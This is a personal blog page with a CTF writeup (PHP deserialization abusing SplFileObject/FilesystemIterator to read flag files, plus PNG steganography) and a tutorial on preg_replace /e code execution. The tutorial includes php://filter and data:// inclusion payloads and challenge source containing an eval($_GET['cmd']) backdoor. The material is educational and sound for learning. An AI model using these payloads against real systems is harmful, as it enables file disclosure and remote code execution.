<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="YTsang"><meta name="copyright" content="YTsang"><title>Y. blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.8.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.8.2"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Y. blog" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="https://note.youdao.com/yws/api/personal/file/WEB4d4bfca5baf6c87d4aa15350aa33e8a7?method=download&amp;shareKey=fec53138a84367efadb03ddfa08bcb24"></div><div class="author-info__name text-center">YTsang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">17</span></a></div></div></div><nav id="nav" style="background-image: url(https://file.51ppt.vip/2020/2-8/192744-1521977264b903.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Y. blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Y. blog</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/29/DASCTF%E4%B8%89%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0writeup/">DASCTF三月赛复现writeup</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-29</time><div class="content"><p>题目很好，我很菜，一道都没做出来，只能靠师傅们的writeup复现了。其他题等有环境再复现。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.plasf.cn/articles/dasctf202103.html">https://www.plasf.cn/articles/dasctf202103.html</a></p>
</blockquote>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h2><p>这道题当时有思路，但是做不出来，看Gq师傅的writeup后才知道，学到了新知识。</p>
<ul>
<li><p>题目直接给源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class;</span><br><span class="line">    <span class="keyword">public</span> $para;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;B&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;ctfer&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;bad hacker~&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = $a;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params">$code</span>)</span>&#123;</span><br><span class="line">        $pattern = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match($pattern, $code))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
</li>
<li><p>序列化反序列化的题，可以动态拼接类，Gq师傅用原生类读文件。</p>
<blockquote>
<p>官方文档<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/book.spl.php">https://www.php.net/manual/zh/book.spl.php</a></p>
</blockquote>
<p>这里借用Gq师傅的表格</p>
<table>
<thead>
<tr>
<th>类</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>DirectoryIterator</td>
<td>遍历目录</td>
</tr>
<tr>
<td>FilesystemIterator</td>
<td>遍历目录</td>
</tr>
<tr>
<td>GlobIterator</td>
<td>遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag*</td>
</tr>
<tr>
<td>SplFileObject</td>
<td>读取文件，按行读取，多行需要遍历</td>
</tr>
<tr>
<td>finfo/finfo_open()</td>
<td>需要两个参数</td>
</tr>
</tbody></table>
</li>
<li><p>用<code>FilesystemIterator</code>遍历/var/www/html，找到包含flag的文件。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class=<span class="string">&#x27;FilesystemIterator&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $para=<span class="string">&quot;/var/www/html&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    &#125;</span><br><span class="line">$o  = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEBb8fb20554988460b12a9ec271a25d838?method=download&shareKey=7a740fd9726050a841fa2d2892a2537e"></p>
</li>
<li><p>再用<code>SplFileObject</code>读文件上诉文件夹，找到flag.php。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class=<span class="string">&#x27;SplFileObject&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $para=<span class="string">&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    &#125;</span><br><span class="line">$o = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB2ac6ee624f7924022d5810d5e458309f?method=download&shareKey=dc2f4c9cdbf177cfc99ed3daadcbb6c7"></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB466f68270c72e85aaddfcddf82039808?method=download&shareKey=cc035a659dfc28b581cbdceadf84040f"></p>
</li>
</ul>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><ul>
<li><p>关注公众号念词，识别正确就给flag，有一说一这普通话还真不容易。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB5d4ecefaa0f75b9ca9072be53bb07c13?method=download&shareKey=46387282b3ea12983e7337bf5f05424f"></p>
</li>
</ul>
<h2 id="简单的png隐写"><a href="#简单的png隐写" class="headerlink" title="简单的png隐写"></a>简单的png隐写</h2><ul>
<li><p>ctf一般不会没提示让爆破，猜测是伪加密，果不其然两个图。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBc1f5c06c05ad11aef56195f856f70125?method=download&shareKey=d7982a2c5a9242a56fb2631079cf30fa"></p>
</li>
<li><p>题目是png隐写，那先从png这张图看，当时做的时候重心偏在jpg了，丢tweakpng里看一下，发现有两个IDAT块。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB26f9a56309501e92d76ee44f6bf81933?method=download&shareKey=a7da92173b9f62af4f4a80dd0987537b"></p>
</li>
<li><p>将上面四条删除，重新保存，出现一张提示，<code>89504E</code>是密码，用outguess解。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB3dfd4da378b26803461f29cae4beb2a3?method=download&shareKey=cd4230ab091b2f45e2c6f50e13012253"></p>
</li>
<li><p>用outguess解完是一串base64编码的字符串。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBf729302eaa9226eefa7368d8124e834d?method=download&shareKey=1d41e21e488ba2aac1f5a42676ee54dd"></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBc39202ad7e539bfcc22e83ae6fe2afe1?method=download&shareKey=5a2dc253c344cfdcb97d742ec8bd6218"></p>
</li>
<li><p>解码后是一串十六进制数，再将十六进制数转换为字符串，发现有flag文件。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBbd04ef4167cd5425f5db4fb6c703f90b?method=download&shareKey=005121d5c948063df662ae362630f587"></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBe8f8971889c222a0dfa32db35613266c?method=download&shareKey=4c7b94bd274c60efdbdce6cb0f159815"></p>
</li>
<li><p>最后把这串十六进制数放进winhex。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB83adebdf25a5b869893c5ed876ae6c04?method=download&shareKey=a2a89b0410431e46e54d1d43abf2bee9"></p>
</li>
<li><p>用压缩包形式打开，得到flag。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB55357095f9d77d539e886a6cc7917b18?method=download&shareKey=14ffa922f9e8a21d4948cfdf66a3a325"></p>
</li>
</ul>
<h2 id="雾都孤儿"><a href="#雾都孤儿" class="headerlink" title="雾都孤儿"></a>雾都孤儿</h2><p>还在学习中，果然misc要学的东西又多又杂</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/28/preg-replace-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">preg_replace()代码执行</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-28</time><div class="content"><h1 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace() 函数"></a>preg_replace() 函数</h1><p>先看一下php对preg_replace() 函数定义</p>
<blockquote>
<p> preg_replace — 执行一个正则表达式的搜索和替换 </p>
</blockquote>
<p>preg_replace在ctf中非常常见，其主要通过正则匹配用于对字符串的过滤，从而实现保护。</p>
<blockquote>
<p>preg_replace ( <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed">mixed</a> <code>$pattern</code> , <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed">mixed</a> <code>$replacement</code> , <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed">mixed</a> <code>$subject</code> , int <code>$limit</code> = -1 , int <code>&amp;$count</code> = ? ) : <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed">mixed</a> </p>
<p>搜索 <code>subject</code> 中匹配 <code>pattern</code> 的部分，以 <code>replacement</code> 进行替换。 </p>
</blockquote>
<p>先看一下官方例子</p>
<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>这个例子就是通过<code>/(\w+) (\d+), (\d+)/i</code>这个正则表达式匹配<code>$string</code>,从而实现替换。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$string = <span class="string">&#x27;April 15, 2003&#x27;</span>;</span><br><span class="line">$pattern = <span class="string">&#x27;/(\w+) (\d+), (\d+)/i&#x27;</span>;</span><br><span class="line">$replacement = <span class="string">&#x27;$&#123;1&#125;1,$3&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> preg_replace($pattern, $replacement, $string);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以通过改变<code>replacement</code>实现对<code>$string</code>的不同替换</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB5b2b27a6721fcb0e7017a13885b5923a?method=download&shareKey=dbe48fbaebd489b983944576b8275ed7"></p>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p> preg_replace()中使用基于索引的数组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$string = <span class="string">&#x27;The quick brown fox jumps over the lazy dog.&#x27;</span>;</span><br><span class="line">$patterns = <span class="keyword">array</span>();</span><br><span class="line">$patterns[<span class="number">0</span>] = <span class="string">&#x27;/quick/&#x27;</span>;</span><br><span class="line">$patterns[<span class="number">1</span>] = <span class="string">&#x27;/brown/&#x27;</span>;</span><br><span class="line">$patterns[<span class="number">2</span>] = <span class="string">&#x27;/fox/&#x27;</span>;</span><br><span class="line">$replacements = <span class="keyword">array</span>();</span><br><span class="line">$replacements[<span class="number">2</span>] = <span class="string">&#x27;bear&#x27;</span>;</span><br><span class="line">$replacements[<span class="number">1</span>] = <span class="string">&#x27;black&#x27;</span>;</span><br><span class="line">$replacements[<span class="number">0</span>] = <span class="string">&#x27;slow&#x27;</span>;</span><br><span class="line">ksort($patterns);</span><br><span class="line">ksort($replacements);</span><br><span class="line"><span class="keyword">echo</span> preg_replace($patterns, $replacements, $string);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEBc3cdc2407f0985b88b85f6f1a4f8462a?method=download&shareKey=81e22a0941276b8d23bd4b13d2a5ba2d"></p>
<p>其中<code>ksort()</code>函数是对数组进行升序排序，若未进行排序，则如下图所示</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB9f8bde0c8edd6880cc2abfd3fc3f205d?method=download&shareKey=c173737b1f0fa1cfb5a19b02d870ba49"></p>
<p>**ps.**使用<code>asort</code>进行降序排序。</p>
<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p> 剥离多余的空白字符 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = <span class="string">&#x27;foo   o&#x27;</span>;</span><br><span class="line">$str = preg_replace(<span class="string">&#x27;/\s\s+/&#x27;</span>, <span class="string">&#x27; &#x27;</span>, $str);</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过<code>/\s\s+/</code>匹配空白符替换成一个空白符。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBb7c9ee1cb08d6d30e7a0537b030f0962?method=download&shareKey=a4e839d8ac5e99632b205d14b8f497fa"></p>
<h2 id="部分正则表达式"><a href="#部分正则表达式" class="headerlink" title="部分正则表达式"></a>部分正则表达式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\w 匹配字母或数字或下划线或汉字 即&#39;[^A-Za-z0-9_]&#39;</span><br><span class="line"></span><br><span class="line">\s 匹配任意的空白符</span><br><span class="line"></span><br><span class="line">\d 匹配数字</span><br><span class="line"></span><br><span class="line">\b 匹配单词的开始或结束</span><br></pre></td></tr></table></figure>

<p>这里提供一个脚本，可以跑出不被正则匹配的字符。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$allow = [];</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">255</span>; $i++)&#123;</span><br><span class="line">    $string =chr($i);</span><br><span class="line">    <span class="keyword">if</span> ( !preg_match(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>, $string))&#123;</span><br><span class="line">        $allow[$i]=$string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">print_r($allow);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="preg-replace-代码执行"><a href="#preg-replace-代码执行" class="headerlink" title="preg_replace()代码执行"></a>preg_replace()代码执行</h1><p>preg_replace()作为常见的函数，有一个非常典型的漏洞，那就是 preg_replace /e 模式下的代码执行问题 ，首先先了解一下什么是<code>/e</code></p>
<h2 id="模式修饰符"><a href="#模式修饰符" class="headerlink" title="模式修饰符"></a>模式修饰符</h2><blockquote>
<p><em>i</em> (<code>PCRE_CASELESS</code>)</p>
<p>如果设置了这个修饰符，模式中的字母会进行大小写不敏感匹配。</p>
<p><em>m</em> (<code>PCRE_MULTILINE</code>)</p>
<p>默认情况下，PCRE 认为目标字符串是由单行字符组成的(然而实际上它可能会包含多行)， “行首”元字符 (^) 仅匹配字符串的开始位置， 而”行末”元字符 ($) 仅匹配字符串末尾， 或者最后的换行符(除非设置了 <em>D</em> 修饰符)。这个行为和 perl 相同。 当这个修饰符设置之后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外， 还分别匹配目标字符串的最开始和最末尾位置。这等同于 perl 的 /m 修饰符。如果目标字符串 中没有 “\n” 字符，或者模式中没有出现 ^ 或 $，设置这个修饰符不产生任何影响。</p>
<p><em>s</em> (<code>PCRE_DOTALL</code>)</p>
<p>如果设置了这个修饰符，模式中的点号元字符匹配所有字符，包含换行符。如果没有这个 修饰符，点号不匹配换行符。这个修饰符等同于 perl 中的/s修饰符。 一个取反字符类比如 [^a] 总是匹配换行符，而不依赖于这个修饰符的设置。</p>
<p><em>x</em> (<code>PCRE_EXTENDED</code>)</p>
<p>如果设置了这个修饰符，模式中的没有经过转义的或不在字符类中的空白数据字符总会被忽略， 并且位于一个未转义的字符类外部的#字符和下一个换行符之间的字符也被忽略。 这个修饰符 等同于 perl 中的 /x 修饰符，使被编译模式中可以包含注释。 注意：这仅用于数据字符。 空白字符 还是不能在模式的特殊字符序列中出现，比如序列 (?( 引入了一个条件子组(译注: 这种语法定义的 特殊字符序列中如果出现空白字符会导致编译错误。 比如(?(就会导致错误)。</p>
</blockquote>
<p>而官方已经弃用<code>/e</code></p>
<blockquote>
<p>如果设置了这个被弃用的修饰符， <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.preg-replace.php">preg_replace()</a> 在进行了对替换字符串的 后向引用替换之后, 将替换后的字符串作为php 代码评估执行(eval 函数方式)，并使用执行结果 作为实际参与替换的字符串。单引号、双引号、反斜线(<code>\</code>)和 NULL 字符在 后向引用替换时会被用反斜线转义. </p>
</blockquote>
<p>为防止出现代码执行攻击，可采用<code>preg_replace_callback()  </code>替代</p>
<h2 id="preg-replace-e"><a href="#preg-replace-e" class="headerlink" title="preg_replace /e"></a>preg_replace /e</h2><p>使用/e修饰符，preg_replace会将 replacement 参数当作 PHP 代码执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">&#x27;/(.*)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\1&quot;)&#x27;</span>, <span class="string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面的命令执行，相当于 eval(‘strtolower(“\1”);’) 结果 ,而\1实际则为第一个匹配项，那么就等于执行了phpinfo()。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB917f664b0541d80ab5a84e938b1fae3b?method=download&shareKey=0f5e66b41f4c0ad1f663a944fbecab2f"></p>
<h2 id="靶机分析"><a href="#靶机分析" class="headerlink" title="靶机分析"></a>靶机分析</h2><ul>
<li><p>直接给出源码,<code>file_get_contents</code>需全等于<code>ohhhhhhhhhhhhh</code>同时读ohhh.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">&quot;contents&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;ohhhhhhhhhhhhh&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h4&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h4&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONONO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//ohhh.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>用data://和php://伪协议绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contents&#x3D;data:text&#x2F;plain;base64,b2hoaGhoaGhoaGhoaGg&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;ohhh.php</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEBf6c0a88ee51e9180956d2f651e391f71?method=download&shareKey=3276110a6f0fa571cc0a69c449bc42f4"></p>
</li>
<li><p>base64解码后即为ohhh.php源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$_SESSION[<span class="string">&#x27;id&#x27;</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params">$re, $str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . $re . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

